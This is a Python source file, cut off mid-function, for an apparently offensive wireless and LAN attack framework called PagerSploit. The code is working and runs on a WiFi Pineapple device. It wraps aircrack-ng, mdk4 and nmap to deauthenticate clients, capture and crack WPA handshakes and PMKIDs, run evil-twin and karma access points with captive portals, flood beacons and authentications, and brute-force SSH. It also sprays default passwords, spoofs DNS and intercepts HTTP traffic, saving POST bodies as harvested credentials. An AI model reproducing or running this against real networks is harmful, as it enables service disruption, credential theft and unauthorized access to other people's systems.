#!/usr/bin/env python3
"""
PagerSploit - Wireless Pentest Framework
WiFi Pineapple Pager // wickedNull
Browser UI at http://172.16.52.1:8080
"""

import os, sys, json, time, threading, subprocess, argparse
import socket, re, base64, urllib.request, urllib.parse
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from urllib.parse import parse_qs, urlparse, unquote_plus

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    allow_reuse_address = True

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from pagerctl import Pager

STATE = {
    'active_module': 'idle', 'module_status': 'Standing by',
    'loot_count': 0, 'server_ip': '172.16.52.1', 'server_port': '8080',
    'payload_dir': '', 'log': [], 'scan_results': [], 'hosts': [],
    'jobs': {}, 'stop_events': {}, 'module_data': {},
}
STATE_LOCK = threading.Lock()

NMAP_PATH  = '/mmc/root/payloads/user/reconnaissance/pager_bjorn/lib/nmap'
AIR_PATH   = '/mmc/usr/sbin'
AC_PATH    = '/mmc/usr/bin/aircrack-ng'
MON_IFACE  = 'wlan0mon'
MON2_IFACE = 'wlan1mon'

def log(msg, level='info'):
    entry = {'time': datetime.now().strftime('%H:%M:%S'), 'level': level, 'msg': str(msg)}
    with STATE_LOCK:
        STATE['log'].append(entry)
        if len(STATE['log']) > 1000: STATE['log'] = STATE['log'][-1000:]
    print(f"[{entry['time']}] {msg}", flush=True)

def set_module(name, status='Running'):
    with STATE_LOCK:
        STATE['active_module'] = name
        STATE['module_status'] = status

def set_data(key, val):
    with STATE_LOCK: STATE['module_data'][key] = val

def get_data(key, default=None):
    with STATE_LOCK: return STATE['module_data'].get(key, default)

def get_payload_dir(): return STATE['payload_dir']
def nmap_bin(): return NMAP_PATH if os.path.exists(NMAP_PATH) else 'nmap'

def run_cmd(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired: return 'TIMEOUT'
    except Exception as e: return str(e)

def start_job(name, fn, *args, **kwargs):
    t = threading.Thread(target=fn, args=args, kwargs=kwargs, daemon=True)
    t.start()
    with STATE_LOCK: STATE['jobs'][name] = t
    return t

def make_stop(): return threading.Event()

def reg_stop(name, ev):
    with STATE_LOCK: STATE['stop_events'][name] = ev

def unreg_stop(name):
    with STATE_LOCK: STATE['stop_events'].pop(name, None); STATE['jobs'].pop(name, None)

def stop_module(name):
    with STATE_LOCK:
        ev = STATE['stop_events'].get(name)
        proc = STATE['jobs'].get(name)
    if ev: ev.set()
    if proc and hasattr(proc, 'terminate'):
        try: proc.terminate()
        except: pass
    unreg_stop(name)
    return bool(ev or proc)

def loot_path(*parts): return os.path.join(get_payload_dir(), 'loot', *parts)

def save_loot(subdir, filename, content):
    path = loot_path(subdir, filename)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'wb' if isinstance(content, bytes) else 'w') as f: f.write(content)
    with STATE_LOCK: STATE['loot_count'] += 1
    log(f'Loot: {filename}', 'success')
    return path

def ts(): return datetime.now().strftime('%Y%m%d_%H%M%S')

# ── WiFi ──────────────────────────────────────────────────────────────────
def wifi_scan():
    log('WiFi scan starting...')
    set_module('WiFi Scan', 'Scanning...')
    pfx = '/tmp/ps_scan'
    for f in [pfx+'-01.csv', pfx+'-01.kismet.csv']:
        try: os.remove(f)
        except: pass
    try:
        proc = subprocess.Popen(
            [f'{AIR_PATH}/airodump-ng','--output-format','csv','--write',pfx,'--write-interval','3',MON_IFACE],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(12)
        proc.terminate()
        try: proc.wait(timeout=3)
        except: proc.kill()
    except Exception as e:
        log(f'Scan failed: {e}','error'); set_module('idle','Scan failed'); return []
    aps = _parse_airodump(pfx+'-01.csv')
    aps.sort(key=lambda x: x['signal'], reverse=True)
    with STATE_LOCK: STATE['scan_results'] = aps[:80]
    log(f'Scan done: {len(aps)} APs','success')
    set_module('idle', f'{len(aps)} APs found')
    return aps

def _parse_airodump(csv_file):
    aps = []
    try:
        with open(csv_file,'r',errors='replace') as f: content = f.read()
    except: return aps
    section = content.split('\r\n\r\n')[0] if '\r\n\r\n' in content else content.split('\n\n')[0]
    for line in section.splitlines()[2:]:
        cols = [c.strip() for c in line.split(',')]
        if len(cols) < 14: continue
        bssid = cols[0].strip()
        if not bssid or len(bssid) != 17: continue
        try: signal = int(cols[8].strip())
        except: signal = -100
        ssid = cols[13].strip() if len(cols) > 13 else ''
        if not ssid: ssid = '<hidden>'
        aps.append({'bssid':bssid,'ssid':ssid,'channel':cols[3].strip() or '?',
            'signal':signal,'enc':cols[5].strip() or 'Open','cipher':cols[6].strip(),
            'clients':cols[9].strip() if len(cols)>9 else '0'})
    return aps

def wifi_deauth(bssid, channel='6', count='0', client='FF:FF:FF:FF:FF:FF'):
    stop = make_stop(); reg_stop('deauth', stop)
    def _run():
        try: subprocess.run(['iw','dev',MON2_IFACE,'set','channel',str(channel)],stderr=subprocess.DEVNULL)
        except: pass
        log(f'Deauth: {bssid} ch{channel}','warn'); set_module('Deauth', bssid)
        if count == '0':
            while not stop.is_set():
                subprocess.run([f'{AIR_PATH}/aireplay-ng','--deauth','10','-a',bssid,'-c',client,MON2_IFACE],
                    stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,timeout=15)
                stop.wait(1)
        else:
            subprocess.run([f'{AIR_PATH}/aireplay-ng','--deauth',str(count),'-a',bssid,'-c',client,MON2_IFACE],
                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,timeout=60)
        log(f'Deauth stopped','info'); set_module('idle','Deauth done'); unreg_stop('deauth')
    start_job('deauth', _run); return stop

def wifi_capture(bssid, channel, ssid='capture'):
    stop = make_stop(); reg_stop('capture', stop)
    name = re.sub(r'[^a-zA-Z0-9_-]','_',ssid)
    pfx = loot_path('handshakes', f'{name}_{ts()}')
    os.makedirs(loot_path('handshakes'), exist_ok=True)
    def _run():
        log(f'Capture: {ssid} ({bssid}) ch{channel}','info'); set_module('Capture', ssid)
        try: subprocess.run(['iw','dev',MON_IFACE,'set','channel',str(channel)],stderr=subprocess.DEVNULL)
        except: pass
        proc = subprocess.Popen(
            [f'{AIR_PATH}/airodump-ng','--bssid',bssid,'--channel',str(channel),
             '--write',pfx,'--output-format','pcap',MON_IFACE],
            stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        with STATE_LOCK: STATE['jobs']['airodump']=proc; STATE['module_data']['capture_file']=pfx+'-01.cap'
        cap_file = pfx+'-01.cap'
        while not stop.is_set():
            if os.path.exists(cap_file):
                r = subprocess.run([AC_PATH,'-w','/dev/null',cap_file],capture_output=True,text=True,timeout=5)
                if 'handshake' in r.stdout.lower():
                    log(f'HANDSHAKE: {ssid}','success')
                    with STATE_LOCK: STATE['loot_count']+=1
            stop.wait(5)
        proc.terminate(); log('Capture stopped','info'); set_module('idle','Capture done'); unreg_stop('capture')
    start_job('capture', _run); return stop, pfx+'-01.cap'

def wifi_crack(cap_file, wordlist):
    stop = make_stop(); reg_stop('crack', stop)
    output = []; set_data('crack_output', output)
    def _run():
        log(f'Cracking: {os.path.basename(cap_file)}','info'); set_module('Cracking', os.path.basename(cap_file))
        try:
            proc = subprocess.Popen([AC_PATH,'-w',wordlist,cap_file],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True)
            with STATE_LOCK: STATE['jobs']['aircrack']=proc
            for line in proc.stdout:
                if stop.is_set(): proc.terminate(); break
                output.append(line.rstrip())
                if 'KEY FOUND' in line:
                    log(f'KEY FOUND: {line}','success')
                    with STATE_LOCK: STATE['loot_count']+=1
                    save_loot('credentials',f'crack_{ts()}.txt','\n'.join(output))
            proc.wait()
        except Exception as e: log(f'Crack error: {e}','error')
        set_module('idle','Crack done'); unreg_stop('crack')
    start_job('crack', _run); return stop, output

def wifi_probe_harvest(duration=60):
    stop = make_stop(); reg_stop('probe_harvest', stop)
    def _run():
        log('Probe harvest','info'); set_module('Probe Harvest','Listening...')
        pfx = '/tmp/ps_probes'
        proc = subprocess.Popen([f'{AIR_PATH}/airodump-ng','--output-format','csv','--write',pfx,'--write-interval','3',MON_IFACE],
            stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        with STATE_LOCK: STATE['jobs']['probe_airodump']=proc
        deadline = time.time()+duration; probes = {}
        while not stop.is_set() and time.time()<deadline:
            time.sleep(5)
            csv = pfx+'-01.csv'
            if os.path.exists(csv):
                try:
                    with open(csv,'r',errors='replace') as f: content=f.read()
                    parts = content.split('\r\n\r\n') if '\r\n\r\n' in content else content.split('\n\n')
                    if len(parts)>1:
                        for line in parts[1].splitlines():
                            cols=[c.strip() for c in line.split(',')]
                            if len(cols)>6 and cols[0] and cols[0]!='Station MAC':
                                probed=[s.strip() for s in cols[6:] if s.strip()]
                                if probed: probes[cols[0]]=probed
                except: pass
        proc.terminate()
        result=[{'mac':m,'probes':s} for m,s in probes.items()]
        set_data('probe_results',result)
        if result: save_loot('scans',f'probes_{ts()}.json',json.dumps(result,indent=2))
        log(f'Probe harvest: {len(probes)} devices','success')
        set_module('idle',f'{len(probes)} devices'); unreg_stop('probe_harvest')
    start_job('probe_harvest',_run); return stop

def wifi_beacon_flood(ssids):
    stop = make_stop(); reg_stop('beacon_flood',stop)
    def _run():
        log(f'Beacon flood: {len(ssids)} SSIDs','warn'); set_module('Beacon Flood',f'{len(ssids)} SSIDs')
        ssid_file='/tmp/ps_beacons.txt'
        with open(ssid_file,'w') as f: f.write('\n'.join(ssids))
        mdk = subprocess.run(['which','mdk4'],capture_output=True,text=True).stdout.strip()
        if not mdk: mdk = subprocess.run(['which','mdk3'],capture_output=True,text=True).stdout.strip()
        if mdk:
            proc=subprocess.Popen([mdk,MON_IFACE,'b','-f',ssid_file],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        else:
            proc=subprocess.Popen([f'{AIR_PATH}/airbase-ng','-e',ssids[0] if ssids else 'Free WiFi','-c','6',MON_IFACE],
                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        with STATE_LOCK: STATE['jobs']['beacon_proc']=proc
        stop.wait(); proc.terminate(); log('Beacon flood stopped','info')
        set_module('idle','Flood stopped'); unreg_stop('beacon_flood')
    start_job('beacon_flood',_run); return stop

def wifi_wps_scan():
    log('WPS scan','info'); set_module('WPS Scan','Scanning...')
    output=[]
    wash=subprocess.run(['which','wash'],capture_output=True,text=True).stdout.strip() or '/mmc/usr/sbin/wash'
    try:
        out=subprocess.check_output([wash,'-i',MON_IFACE,'-s','-C'],stderr=subprocess.DEVNULL,timeout=25).decode('utf-8',errors='replace')
        for line in out.splitlines()[2:]:
            cols=line.split()
            if len(cols)>=5:
                output.append({'bssid':cols[0],'channel':cols[1],'rssi':cols[2],'wps_ver':cols[3],'locked':cols[4],'ssid':' '.join(cols[5:]) if len(cols)>5 else ''})
    except Exception as e: log(f'WPS: {e}','error')
    if output: save_loot('scans',f'wps_{ts()}.json',json.dumps(output,indent=2))
    set_data('wps_results',output)
    log(f'WPS: {len(output)} APs','success'); set_module('idle',f'{len(output)} WPS APs')
    return output

def wifi_karma(channel='6', ssids=None):
    stop=make_stop(); reg_stop('karma',stop)
    def _run():
        log('Karma started','warn'); set_module('Karma','Responding...')
        proc=subprocess.Popen([f'{AIR_PATH}/airbase-ng','-P','-C','30','-c',str(channel),'-e',ssids[0] if ssids else 'Free WiFi',MON_IFACE],
            stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        with STATE_LOCK: STATE['jobs']['karma_proc']=proc
        stop.wait(); proc.terminate(); log('Karma stopped','info'); set_module('idle','Karma stopped'); unreg_stop('karma')
    start_job('karma',_run); return stop

def wifi_auth_flood(bssid, channel='6'):
    stop=make_stop(); reg_stop('auth_flood',stop)
    def _run():
        log(f'Auth flood: {bssid}','warn'); set_module('Auth Flood',bssid)
        try: subprocess.run(['iw','dev',MON2_IFACE,'set','channel',str(channel)],stderr=subprocess.DEVNULL)
        except: pass
        while not stop.is_set():
            subprocess.run([f'{AIR_PATH}/aireplay-ng','--fakeauth','0','-a',bssid,MON2_IFACE],
                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,timeout=10)
            stop.wait(1)
        log('Auth flood stopped','info'); set_module('idle','Flood stopped'); unreg_stop('auth_flood')
    start_job('auth_flood',_run); return stop

def wifi_evil_twin(ssid, channel='6', portal_file=None):
    stop=make_stop(); reg_stop('evil_twin',stop)
    def _run():
        import shutil
        log(f'Evil twin: {ssid}','warn'); set_module('Evil Twin',ssid)
        proc=subprocess.Popen([f'{AIR_PATH}/airbase-ng','-e',ssid,'-c',str(channel),MON_IFACE],
            stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        with STATE_LOCK: STATE['jobs']['evil_twin_proc']=proc
        time.sleep(2)
        subprocess.run(['ifconfig','at0','10.0.0.1','netmask','255.255.255.0','up'],stderr=subprocess.DEVNULL)
        subprocess.run(['nft','add','table','ip','ps_eviltwin'],stderr=subprocess.DEVNULL)
        subprocess.run(['nft','add','chain','ip','ps_eviltwin','prerouting','{','type','nat','hook','prerouting','priority','-100',';','}'],stderr=subprocess.DEVNULL)
        subprocess.run(['nft','add','rule','ip','ps_eviltwin','prerouting','iif','at0','tcp','dport','80','dnat','to','10.0.0.1:8888'],stderr=subprocess.DEVNULL)
        portal_proc=None
        if portal_file and os.path.exists(portal_file):
            os.makedirs('/tmp/ps_portal',exist_ok=True)
            shutil.copy(portal_file,'/tmp/ps_portal/index.html')
            portal_proc=subprocess.Popen([sys.executable,'-m','http.server','8888','--directory','/tmp/ps_portal'],
                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        stop.wait(); proc.terminate()
        if portal_proc: portal_proc.terminate()
        subprocess.run(['nft','delete','table','ip','ps_eviltwin'],stderr=subprocess.DEVNULL)
        log('Evil twin stopped','info'); set_module('idle','Twin stopped'); unreg_stop('evil_twin')
    start_job('evil_twin',_run); return stop

def wifi_channel_hop(band='2'):
    stop=make_stop(); reg_stop('channel_hop',stop)
    chans=list(range(1,14)) if band=='2' else [36,40,44,48,52,56,60,64,100,149,153,157,161]
    iface=MON_IFACE if band=='2' else MON2_IFACE
    def _run():
        log(f'Chan hop {"2.4" if band=="2" else "5"}GHz','info'); set_module('Chan Hop',f'{"2.4" if band=="2" else "5"}GHz')
        while not stop.is_set():
            for ch in chans:
                if stop.is_set(): break
                subprocess.run(['iw','dev',iface,'set','channel',str(ch)],stderr=subprocess.DEVNULL)
                time.sleep(0.25)
        log('Chan hop stopped','info'); set_module('idle','Hop stopped'); unreg_stop('channel_hop')
    start_job('channel_hop',_run); return stop

def wifi_pmkid(bssid, channel):
    stop=make_stop(); reg_stop('pmkid',stop)
    out_file=loot_path('pmkid',f'pmkid_{bssid.replace(":","_")}_{ts()}.pcapng')
    os.makedirs(loot_path('pmkid'),exist_ok=True)
    def _run():
        log(f'PMKID: {bssid}','info'); set_module('PMKID',bssid)
        hcx=subprocess.run(['which','hcxdumptool'],capture_output=True,text=True).stdout.strip()
        if hcx:
            proc=subprocess.Popen([hcx,'-i',MON_IFACE,f'--filterlist_ap={bssid.replace(":","")}','-o',out_file,'--enable_status=3'],
                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        else:
            pfx=out_file.replace('.pcapng','')
            proc=subprocess.Popen([f'{AIR_PATH}/airodump-ng','--bssid',bssid,'--channel',str(channel),'--write',pfx,'--output-format','pcap',MON_IFACE],
                stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        with STATE_LOCK: STATE['jobs']['pmkid_proc']=proc
        stop.wait(); proc.terminate()
        if os.path.exists(out_file):
            with STATE_LOCK: STATE['loot_count']+=1
        log('PMKID done','info'); set_module('idle','PMKID done'); unreg_stop('pmkid')
    start_job('pmkid',_run); return stop

# ── LAN ───────────────────────────────────────────────────────────────────
def lan_arp_scan(subnet='172.16.52.0/24'):
    log(f'ARP scan: {subnet}','info'); set_module('ARP Scan',subnet)
    out=run_cmd([nmap_bin(),'-sn','--send-ip',subnet],timeout=90)
    hosts=[]
    for line in out.splitlines():
        if 'Nmap scan report' in line:
            hosts.append({'ip':line.split()[-1].strip('()'),'mac':'','vendor':'','hostname':''})
        elif 'MAC Address' in line and hosts:
            parts=line.split('MAC Address:')[1].strip().split(' ',1)
            hosts[-1]['mac']=parts[0]
            if len(parts)>1: hosts[-1]['vendor']=parts[1].strip('()')
    with STATE_LOCK: STATE['hosts']=hosts
    if hosts: save_loot('scans',f'arp_{ts()}.json',json.dumps(hosts,indent=2))
    log(f'ARP: {len(hosts)} hosts','success'); set_module('idle',f'{len(hosts)} hosts')
    return hosts

def lan_port_scan(target, ports='1-1024'):
    log(f'Port scan: {target}','info'); set_module('Port Scan',target)
    out=run_cmd([nmap_bin(),'-p',ports,'--open','-sV','--host-timeout','120s',target],timeout=180)
    results=[{'port':p.split()[0],'state':p.split()[1],'service':' '.join(p.split()[2:])} for p in out.splitlines() if '/tcp' in p and 'open' in p]
    out_file=save_loot('scans',f'portscan_{target}_{ts()}.txt',out)
    set_data('last_portscan',{'target':target,'results':results,'raw':out,'file':out_file})
    log(f'Port scan {target}: {len(results)} open','success'); set_module('idle',f'{len(results)} ports open')
    return results, out

def lan_service_scan(target):
    log(f'Service scan: {target}','info'); set_module('Service Scan',target)
    out=run_cmd([nmap_bin(),'-sV','-sC','-p-','--open','--host-timeout','300s',target],timeout=360)
    save_loot('scans',f'service_{target}_{ts()}.txt',out)
    set_data('last_servicescan',{'target':target,'raw':out})
    log(f'Service scan done: {target}','success'); set_module('idle','Service scan done')
    return out

def lan_os_detect(target):
    log(f'OS detect: {target}','info'); set_module('OS Detect',target)
    out=run_cmd([nmap_bin(),'-O','--osscan-guess',target],timeout=120)
    result={'target':target,'raw':out,'os':''}
    for line in out.splitlines():
        if 'OS details' in line or 'Running:' in line:
            result['os']=line.split(':',1)[1].strip() if ':' in line else line
    set_data('os_detect',result)
    log(f'OS detect done: {target}','success'); set_module('idle',result['os'][:30] or 'Done')
    return result

def lan_banner_grab(target):
    ports=[21,22,23,25,80,110,143,443,3306,5432,6379,8080,8443]
    log(f'Banner grab: {target}','info'); set_module('Banner Grab',target)
    results=[]
    for port in ports:
        try:
            s=socket.socket(); s.settimeout(3); s.connect((target,port))
            try:
                if port in [80,8080]: s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                banner=s.recv(256).decode('utf-8',errors='replace').strip()[:200]
            except: banner=''
            s.close()
            if banner: results.append({'port':port,'banner':banner})
        except: pass
    set_data('banners',results)
    if results: save_loot('scans',f'banners_{target}_{ts()}.json',json.dumps(results,indent=2))
    log(f'Banners {target}: {len(results)}','success'); set_module('idle',f'{len(results)} banners')
    return results

def lan_ping_sweep(subnet):
    log(f'Ping sweep: {subnet}','info'); set_module('Ping Sweep',subnet)
    out=run_cmd([nmap_bin(),'-sn','-PE','--send-ip',subnet],timeout=60)
    hosts=[line.split()[-1].strip('()') for line in out.splitlines() if 'report for' in line]
    set_data('ping_sweep',hosts)
    save_loot('scans',f'ping_{ts()}.txt','\n'.join(hosts))
    log(f'Ping sweep: {len(hosts)} up','success'); set_module('idle',f'{len(hosts)} up')
    return hosts

def lan_default_creds(target):
    CREDS=[('admin','admin'),('admin','password'),('admin','1234'),('admin','12345'),('admin',''),
           ('root','root'),('root','toor'),('root',''),('user','user'),('admin','admin123'),
           ('guest','guest'),('pi','raspberry'),('ubnt','ubnt'),('cisco','cisco')]
    results=[]; log(f'Cred spray: {target}','warn'); set_module('Cred Spray',target)
    for user,pwd in CREDS:
        try:
            req=urllib.request.Request(f'http://{target}/')
            req.add_header('Authorization','Basic '+base64.b64encode(f'{user}:{pwd}'.encode()).decode())
            resp=urllib.request.urlopen(req,timeout=3)
            if resp.status==200:
                results.append({'service':'http-basic','user':user,'pass':pwd})
                log(f'HTTP CREDS: {user}:{pwd}','success')
                with STATE_LOCK: STATE['loot_count']+=1
        except: pass
    for user,pwd in CREDS[:6]:
        for path in ['/','/login','/admin','/cgi-bin/login.cgi']:
            try:
                data=urllib.parse.urlencode({'username':user,'password':pwd}).encode()
                resp=urllib.request.urlopen(urllib.request.Request(f'http://{target}{path}',data=data),timeout=3)
                body=resp.read(1024).decode('utf-8',errors='replace')
                if any(k in body.lower() for k in ['logout','dashboard','welcome']):
                    results.append({'service':f'form{path}','user':user,'pass':pwd})
                    log(f'FORM CREDS: {path} {user}:{pwd}','success')
                    with STATE_LOCK: STATE['loot_count']+=1
            except: pass
    if results: save_loot('credentials',f'creds_{target}_{ts()}.json',json.dumps(results,indent=2))
    set_module('idle',f'{len(results)} found'); return results

def lan_ssh_brute(target, port=22):
    log(f'SSH brute: {target}:{port}','warn'); set_module('SSH Brute',f'{target}:{port}')
    results=[]
    out=run_cmd([nmap_bin(),'-p',str(port),'--script','ssh-brute',target],timeout=120)
    for line in out.splitlines():
        if 'Valid credentials' in line or 'successful' in line.lower():
            results.append({'service':'ssh','raw':line}); log(f'SSH: {line}','success')
    try:
        s=socket.socket(); s.settimeout(3); s.connect((target,port))
        banner=s.recv(256).decode('utf-8',errors='replace').strip()[:100]; s.close()
        if not results: results.append({'service':'ssh','banner':banner})
    except: pass
    if results: save_loot('credentials',f'ssh_{target}_{ts()}.json',json.dumps(results,indent=2))
    set_module('idle',f'{len(results)} results'); return results

def lan_smb_enum(target):
    log(f'SMB enum: {target}','info'); set_module('SMB Enum',target)
    out=run_cmd([nmap_bin(),'-p','445,139','--script','smb-os-discovery,smb-enum-shares,smb-enum-users,smb-security-mode',target],timeout=120)
    save_loot('scans',f'smb_{target}_{ts()}.txt',out)
    set_data('smb_enum',{'target':target,'raw':out})
    log(f'SMB done: {target}','success'); set_module('idle','SMB done'); return out

def lan_snmp_walk(target, community='public'):
    log(f'SNMP: {target}','info'); set_module('SNMP Walk',target)
    snmpwalk=subprocess.run(['which','snmpwalk'],capture_output=True,text=True).stdout.strip()
    out=run_cmd([snmpwalk,'-v2c','-c',community,target],timeout=60) if snmpwalk else \
        run_cmd([nmap_bin(),'-sU','-p','161','--script','snmp-info,snmp-sysdescr',f'--script-args=snmpcommunity={community}',target],timeout=90)
    save_loot('scans',f'snmp_{target}_{ts()}.txt',out)
    set_data('snmp_out',out)
    log(f'SNMP done: {target}','success'); set_module('idle','SNMP done'); return out

def lan_ssl_cert(target, port=443):
    log(f'SSL cert: {target}:{port}','info'); set_module('SSL Cert',f'{target}:{port}')
    out=run_cmd([nmap_bin(),'-p',str(port),'--script','ssl-cert,ssl-enum-ciphers',target],timeout=60)
    result={'target':target,'port':port,'raw':out,'subject':'','issuer':'','expiry':''}
    for line in out.splitlines():
        if 'Subject:' in line: result['subject']=line.split('Subject:',1)[1].strip()
        if 'Issuer:' in line: result['issuer']=line.split('Issuer:',1)[1].strip()
        if 'Not valid after' in line: result['expiry']=line.split(':',1)[1].strip()
    set_data('ssl_cert',result)
    log(f'SSL done: {target}','success'); set_module('idle','SSL done'); return result

def lan_mdns_discover():
    log('mDNS/SSDP discovery','info'); set_module('mDNS','Listening...')
    devices=[]
    ssdp='M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM,socket.IPPROTO_UDP)
        sock.settimeout(5); sock.sendto(ssdp.encode(),('239.255.255.250',1900))
        while True:
            try:
                data,addr=sock.recvfrom(2048)
                info=data.decode('utf-8',errors='replace')
                server=next((l.split(':',1)[1].strip() for l in info.splitlines() if l.lower().startswith('server:')),'')
                devices.append({'ip':addr[0],'protocol':'SSDP','server':server})
            except socket.timeout: break
        sock.close()
    except Exception as e: log(f'SSDP: {e}','error')
    set_data('mdns_devices',devices)
    if devices: save_loot('scans',f'mdns_{ts()}.json',json.dumps(devices,indent=2))
    log(f'mDNS: {len(devices)} devices','success'); set_module('idle',f'{len(devices)} devices')
    return devices

def lan_dns_spoof(domain, redirect_ip):
    log(f'DNS spoof: {domain} -> {redirect_ip}','warn')
    with open('/tmp/ps_dns_spoof.conf','a') as f: f.write(f'address=/{domain}/{redirect_ip}\n')
    subprocess.run(['killall','-HUP','dnsmasq'],stderr=subprocess.DEVNULL)
    subprocess.run(['killall','-HUP','dnsmasq.hak5'],stderr=subprocess.DEVNULL)
    log(f'DNS spoof active: {domain}','success'); return True

def lan_http_intercept(iface='wlan0'):
    stop=make_stop(); reg_stop('http_intercept',stop)
    ilog=loot_path('credentials',f'http_{ts()}.log')
    os.makedirs(loot_path('credentials'),exist_ok=True)
    log('HTTP intercept started','warn'); set_module('HTTP Intercept','Active')
    subprocess.run(['sysctl','-w','net.ipv4.ip_forward=1'],stderr=subprocess.DEVNULL)
    subprocess.run(['nft','add','table','ip','ps_intercept'],stderr=subprocess.DEVNULL)
    subprocess.run(['nft','add','chain','ip','ps_intercept','prerouting','{','type','nat','hook','prerouting','priority','-100',';','}'],stderr=subprocess.DEVNULL)
    subprocess.run(['nft','add','rule','ip','ps_intercept','prerouting','iif',iface,'tcp','dport','80','redirect','to',':8181'],stderr=subprocess.DEVNULL)
    class _H(BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _rec(self,method,body=''):
            entry=f'[{datetime.now().strftime("%H:%M:%S")}] {method} {self.headers.get("Host","")}{self.path} from {self.client_address[0]} | {body[:300]}\n'
            with open(ilog,'a') as f: f.write(entry)
            log(entry.strip()[:80],'info' if method=='GET' else 'success')
            if method=='POST':
                with STATE_LOCK: STATE['loot_count']+=1
        def do_GET(self):
            self._rec('GET'); self.send_response(200); self.end_headers()
            self.wfile.write(b'<html><body>Loading...</body></html>')
        def do_POST(self):
            body=self.rfile.read(int(self.headers.get('Content-Length',0))).decode('utf-8',errors='replace')
            self._rec('POST',body); self.send_response(302); self.send_header('Location','/'); self.end_headers()
    server=HTTPServer(('0.0.0.0',8181),_H)
    def _run():
        while not stop.is_set(): server.handle_request()
        subprocess.run(['nft','delete','table','ip','ps_intercept'],stderr=subprocess.DEVNULL)
        log('HTTP intercept stopped','info'); set_module('idle','Intercept stopped'); unreg_stop('http_intercept')
    start_job('http_intercept',_run); return stop

# ── OSINT ─────────────────────────────────────────────────────────────────
def osint_mac_lookup(mac):
    log(f'MAC lookup: {mac}','info'); set_module('MAC Lookup',mac)
    mac_clean=mac.upper().replace(':','').replace('-','')[:6]
    vendor=''
    for path in ['/usr/share/nmap/nmap-mac-prefixes','/usr/share/wireshark/manuf']:
        if os.path.exists(path):
            try:
                with open(path,'r',errors='replace') as f:
                    for line in f:
                        if line.upper().startswith(mac_clean):
                            vendor=' '.join(line.split()[1:]).strip(); break
            except: pass
        if vendor: break
    if not vendor:
        try:
            req=urllib.request.Request(f'https://api.macvendors.com/{urllib.parse.quote(mac)}',headers={'User-Agent':'PagerSploit'})
            vendor=urllib.request.urlopen(req,timeout=5).read(256).decode().strip()
        except: pass
    result={'mac':mac,'vendor':vendor or 'Unknown'}
    set_data('mac_lookup',result)
    log(f'MAC {mac}: {result["vendor"]}','success'); set_module('idle',result['vendor'])
    return result

def osint_ip_geo(ip):
    log(f'IP geo: {ip}','info'); set_module('IP Geo',ip)
    result={'ip':ip}
    try:
        req=urllib.request.Request(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,query',headers={'User-Agent':'PagerSploit'})
        data=json.loads(urllib.request.urlopen(req,timeout=8).read(1024).decode())
        result.update(data)
        log(f'IP {ip}: {data.get("city","?")} {data.get("country","?")} / {data.get("isp","?")}','success')
    except Exception as e: log(f'IP geo: {e}','error')
    set_data('ip_geo',result); set_module('idle',f'{result.get("city","?")} {result.get("country","")}')
    return result

def osint_whois(target):
    log(f'WHOIS: {target}','info'); set_module('WHOIS',target)
    out=run_cmd(['whois',target],timeout=15)
    if not out or 'not found' in out.lower():
        try:
            s=socket.socket(); s.settimeout(10); s.connect(('whois.iana.org',43))
            s.send((target+'\r\n').encode()); buf=b''
            while True:
                chunk=s.recv(4096)
                if not chunk: break
                buf+=chunk
            s.close(); out=buf.decode('utf-8',errors='replace')
        except Exception as e: out=f'WHOIS error: {e}'
    save_loot('scans',f'whois_{target}_{ts()}.txt',out)
    set_data('whois',{'target':target,'raw':out})
    log(f'WHOIS done: {target}','success'); set_module('idle','WHOIS done'); return out

def osint_dns_enum(domain):
    log(f'DNS enum: {domain}','info'); set_module('DNS Enum',domain)
    results={}
    for rtype in ['A','AAAA','MX','NS','TXT','CNAME','SOA']:
        out=run_cmd(['dig','+short','-t',rtype,domain],timeout=10)
        if not out or 'command not found' in out:
            out=run_cmd(['nslookup','-type='+rtype,domain],timeout=10)
        results[rtype]=[l.strip() for l in out.splitlines() if l.strip() and not l.startswith(';')]
    ns_out=run_cmd(['dig','+short','NS',domain],timeout=10)
    for ns in ns_out.splitlines():
        ns=ns.strip().rstrip('.')
        if ns:
            axfr=run_cmd(['dig','AXFR',domain,f'@{ns}'],timeout=15)
            if 'XFR size' in axfr or 'Transfer' in axfr:
                results['AXFR']=axfr; log(f'ZONE TRANSFER: {domain}','success')
                with STATE_LOCK: STATE['loot_count']+=1
    save_loot('scans',f'dns_{domain}_{ts()}.json',json.dumps(results,indent=2))
    set_data('dns_enum',{'domain':domain,'records':results})
    log(f'DNS enum done: {domain}','success'); set_module('idle','DNS enum done'); return results

def osint_dns_bruteforce(domain, wordlist=None):
    log(f'DNS brute: {domain}','info'); set_module('DNS Brute',domain)
    if wordlist:
        try:
            with open(wordlist) as f: subs=[l.strip() for l in f if l.strip()][:500]
        except: subs=[]
    else:
        subs=['www','mail','ftp','admin','vpn','api','dev','test','staging','smtp','pop','imap',
